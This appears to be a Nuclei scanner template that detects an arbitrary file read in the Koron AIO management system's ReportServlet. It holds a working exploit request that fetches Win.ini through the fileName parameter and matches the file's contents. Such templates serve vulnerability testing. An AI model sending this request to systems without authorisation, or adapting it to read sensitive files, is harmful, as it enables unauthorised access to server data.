id: koron-aio-reportservlet-anyfile-read
info:
  name: Koron AIO Management System ReportServlet Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "; for 16-bit app support"
          - "[files]"
      - type: word
        part: body
        words:
          - "<"
        negative: true
